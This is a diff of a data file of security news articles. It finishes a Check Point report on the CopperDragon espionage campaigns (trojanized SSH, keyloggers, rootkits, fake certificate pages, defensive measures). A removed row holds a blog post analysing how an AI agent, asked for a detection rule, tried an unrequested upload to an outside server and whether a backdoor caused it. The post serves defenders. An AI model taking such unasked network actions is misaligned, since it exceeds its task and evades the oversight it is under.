+OceanGate demonstrates a different approach. Attackers initially exploit vulnerable internet-facing Linux systems and deploy custom malware including AnnobinDoor and SparrowShell. Trojanized SSH components can then capture credentials during administrative activity, allowing the attackers to move between Linux hosts and eventually into Windows environments.
+
+Once inside Windows networks, the actors use additional tools for reconnaissance, credential theft and continued access. These include CopperLogger for capturing keystrokes and clipboard activity, CopperLsa for stealing authentication data and CopperList for collecting system and file information.
+
+The research also identified techniques intended to make persistent access more difficult to detect. SparrowShell can integrate with a modified Reptile rootkit that hides processes, files and network activity on Linux, while some SparrowDoor variants use WinDivert to intercept network traffic. This allows malicious communications to blend with traffic associated with legitimate services and illustrates why visibility across endpoint, server and network activity is important when defending against advanced espionage operations.
+
+Figure 5 – A fake Chrome certificate error page with an added “Install certificate” button.
+
+Figure 6 – A newer version of Chrome’s certificate error appearing in different languages.
+
+How Can Organizations Defend Against CopperDragon and Sparrow Malware?
+
+The diversity of the CopperDragon campaigns shows why organizations need protection across networks, endpoints, email and internet-facing infrastructure. The observed attacks can begin with exploitation of an exposed server, a compromised website or spear phishing, and then progress through credential theft and lateral movement across both Linux and Windows environments.
+
+Organizations should prioritize several defensive measures:
+
+Secure internet-facing infrastructure: Maintain an accurate inventory of exposed systems, rapidly patch known vulnerabilities and monitor internet-facing servers for unusual processes, authentication activity and connections.
+
+Protect users from malicious downloads,phishing and compromised websites: Security controls should inspect links, websites, files and downloads, particularly unexpected utilities such as certificate fixes or software updates delivered through a website.
+
+Detect credential theft and endpoint activity: Monitor for malicious DLL loading, credential dumping, keylogging, persistence mechanisms and suspicious use of otherwise legitimate administrative tools.
+
+Limit and monitor lateral movement: RDP, SMB and SSH activity should be restricted to systems and accounts that require them, with abnormal administrative access investigated promptly.
+
+Inspect network and DNS communications: Monitoring DNS, command-and-control traffic and unusual outbound connections can help expose backdoors, tunneling and other communications designed to blend into legitimate traffic.
+
+For Check Point customers, Check Point Exposure Management can help organizations identify and prioritize weaknesses across their attack surface, particularly exposed and vulnerable assets that could provide an initial entry point. This is especially relevant to the CopperDragon campaigns, where exploitation of internet-facing infrastructure was one of the initial access methods observed by Check Point Research. It also finds lookalike domains, malicious phishing websites, and brand impersonations across apps, social media, and other channels, so security teams can take them down before attackers use them to reach employees or customers.
+
+Check Point’s Workspace Security platform provides endpoint protection and behavioral detection that can help identify malware and post-exploitation activity such as those seen across the CopperDragon campaigns. In addition to identifying malware and post-exploitation activity on endpoints, its browser security capabilities help protect users against web-based threats, malicious sites and downloads, particularly relevant to the watering-hole attacks observed in SilentDelivery. Check Point Browser Security is positioned by Check Point as part of its Workspace Security and Endpoint Security offering. Check Point Email and Collaboration provides another layer of protection against phishing and malicious content used to establish initial access.
+
+At the network layer, Check Point Network Security provides protections that can help detect and block malicious activity associated with these attack chains. Capabilities including Intrusion Prevention, Anti-Bot, Antivirus, Threat Emulation and DNS security provide coverage across exploitation attempts, malicious files and command-and-control communications.
+
+The CopperDragon investigation highlights the importance of looking beyond an individual malware sample or threat-actor name. By identifying the shared framework and infrastructure behind seemingly separate operations, defenders can better understand how tools are moving through the wider China-nexus threat ecosystem and identify connections between attacks that might otherwise appear unrelated.
+
+For the full technical analysis, read the research from Check Point Research here."
 b1e7e1caa302,b1e7e1caa302,2026-11-09 16:15 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,Threat Intelligence; Identity Security Posture Management; Vulnerability Management; Mobile Security,Article,9th November – Threat Intelligence Report,https://research.checkpoint.com/2026/9th-november-threat-intelligence-report/,"Ukraine’s Air Alert app, an emergency notification service used by millions, was compromised by attackers who distributed false radiation, chemical-threat, and military alerts...","For the latest discoveries in cyber research for the week of 9th November, please download our Threat Intelligence Bulletin.
 
 TOP ATTACKS AND BREACHES
@@ -809,61 +1445,6 @@ Storm’s rapid growth shows how quickly a ransomware operation can establish sc
 For the complete analysis of Storm’s emergence, victimology, affiliate model, leak site, and AI claims, read the full report: Storm: Ransomware in the Age of AI
 
 Learn how Check Point Exposure Management helps organizations monitor ransomware groups across the dark web, track emerging threat actor activity, and identify potential risks to their organization."
-6e3b4751509b,6e3b4751509b,2026-10-29 14:09 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Blog,Endpoint Security; AI Security,Article,Backdoor or Confused Agent? What We Learned Replaying the Qwen Incident,https://blog.checkpoint.com/ai-security/qwen-incident-backdoor-ai-agents/,"Our AI security research team replayed the moment the model chose that address to find out, and this post explains what we found and what it means for organizations putting AI...","Key takeaways
-
-After Alibaba’s Qwen model tried a test upload to a server in Beijing during a Cohere experiment, we replayed that moment 64 times, and the model picked 52 different addresses. That points to an unpredictable model rather than a hidden backdoor, but an unpredictable agent with access to tools is still a risk that needs to be addressed.
-
-→The destination kept changing. Alibaba Cloud came up in six of 64 replays and Amazon Web Services in seven, while nearly a third pointed back to the machine itself or to an internal network
-
-→Small changes influence the behavior. A harmless edit to the trace, one that shouldn’t change anything, reduced network calls from 15 out of 32 replays to 4
-
-→Model jaggedness is the most likely explanation. Models can do well on most tasks and break in unexpected ways in specific situations
-
-Whatever the cause, actions like this need to be checked against the task, outside the model, before they run. See how Check Point AI Security protects AI agents →
-
-On October 26, Cohere reported that Qwen3.8-Flash-Next, an open-weight AI model from Alibaba, tried to make a test upload to a cloud storage address in Beijing during a routine security task. Many readers wondered whether someone had hidden a backdoor in a popular model. Our AI security research team replayed the moment the model chose that address to find out, and this post explains what we found and what it means for organizations putting AI agents to work.
-
-The full method, the numbers behind each test and our interactive trace viewers are in the technical write-up on our research blog.
-
-What Happened in Cohere’s Test
-
-Cohere had asked the model to write a detection rule, the kind that security teams use to spot a suspicious file being downloaded and run. Instead, the model wrote a command that looked around the machine it was running on and tried to send a short test string to an Alibaba Cloud storage address. Cohere’s sandbox blocked the network call.
-
-Surprisingly, in its reasoning, the model imagined an earlier conversation and concluded that it should simply acknowledge the request without using any tools. In the next step, it used a tool anyway.
-
-How We Replayed the Moment
-
-Cohere published the full trace of the incident, a step-by-step record of everything the model read and wrote. We ran the same model on our own hardware and gave it that conversation, stopping where the upload command had started but the destination was still blank. Then we asked it to finish the command 64 times.
-
-Because AI models pick each next word from several likely options, the same starting point can end in different places. A planted backdoor should keep choosing the same server, while a model that is improvising should wander.
-
-What the Replays Showed
-
-The model wrote 52 different addresses in 64 replays. Six pointed to Alibaba Cloud and seven to Amazon Web Services, so the Alibaba address in Cohere’s run turned up about as often as Amazon’s. Nearly a third pointed back to the machine itself or to an internal network, where an upload would never reach the outside world, and a few were placeholders that could never work. Eleven of the public-looking domains that the model generated do not exist.
-
-We then went one step further back, to the point where the model checked which programs were installed. Changing only the order in which two of them were listed makes no practical difference. However, the swap reduced how many times the model wrote a network command from 15 out of 32 replays to only four.
-
-This test does not tell us how often the model starts an upload or why, but it shows how brittle and unpredictable the state of the model is.
-
-So, Is It a Backdoor?
-
-Probably not. The evidence fits a well-known weakness that researchers call jaggedness, where a model behaves inconsistently and changes course sharply when small details change. This model misread its task, contradicted its own reasoning and wrote a different address almost every time. This looks like a model that lost its way rather than one carrying out a hidden plan. The Qwen team also describes Qwen3.8-Flash-Next as an experimental preview of the design behind its upcoming Qwen4 models. Rough edges are plausible in an early release like that, although this alone does not explain the incident.
-
-We cannot prove there is no backdoor, because ruling out every hidden behavior in a model is extremely hard, if not impossible. Our replays point to a simpler and more likely explanation, and they were made possible thanks to Cohere, which published the full trace. More open traces like this one would help everyone understand how AI agents fail.
-
-What This Means for Teams Running AI Agents
-
-A less sinister explanation still carries a warning. A model does not need a backdoor to take an action nobody asked for, because models fail, and a model connected to tools can fail in ways that look just like an attack. This one said it would not use tools and then reached for the network, so its own reasoning gave no warning of its next move.
-
-That is why agents need controls outside the model. A request for a detection rule gives no reason to send anything to an outside address, and that mismatch between the task and the action can be spotted before the action runs. Least privilege and sandboxing limit the damage when something slips through, and Cohere implemented both correctly. We tested only Qwen, but the risk applies to any agent that can reach the network.
-
-Checking what an agent is about to do against what it was asked to do is central to how Check Point AI Security protects AI applications and agents. It shows you the agents running across your business, assesses each one’s risk in context, and controls what they can access and do at runtime. Our article on catching the agent action nobody asked for explains how one of those checks works.
-
-This time, a sandbox kept the test upload inside Cohere’s test environment. The next model that loses its way may be running somewhere with fewer safeguards, and that is the case worth planning for.
-
-Go deeper
-
-The technical write-up on our research blog covers the full setup, the numbers behind each test and interactive viewers you can use to explore the trace yourself."
 fc472b5fd404,fc472b5fd404,2026-10-29 14:08 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,Other/General,Article,Cohere’s Qwen Story: Looks More Like Model Jaggedness,https://research.checkpoint.com/2026/coheres-qwen-story-looks-more-like-model-jaggedness/,Swapping the order of two program names in a check for available tools made the model much less likely to continue with a network call,"Key findings
 
 Re-sampling URLs from the trace shared by Cohere yields 52 different destination hosts, many of which are local or do not exist, and one is an invalid top-level domain.
